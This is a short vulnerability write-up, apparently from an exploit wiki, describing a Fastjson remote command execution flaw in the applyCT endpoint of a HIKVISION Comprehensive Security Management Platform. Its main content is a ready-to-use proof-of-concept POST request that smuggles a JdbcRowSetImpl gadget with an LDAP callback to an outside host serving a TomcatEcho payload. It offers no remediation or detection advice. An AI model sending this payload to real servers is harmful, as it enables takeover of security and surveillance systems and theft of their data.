# HIKVISION Comprehensive Security Management Platform applyCT Fastjson Remote Command Execution Vulnerability

## Vulnerability Description

HIKVISION comprehensive security management platform applyCT has a low-version Fastjson remote command execution vulnerability. An attacker can execute any command to obtain server permissions through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">HIKVISION Comprehensive Security Management Platform</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1647517887798-06e24b68-d89a-4223-aee3-50ca22081807.png)

Verify POC

```javascript
POST /bic/ssoService/v1/applyCT 
Content-Type: application/json

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.xxx.xxx.xxx/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661183408780-ae3f95b1-7c3b-42d9-b03a-f2f314309543.png)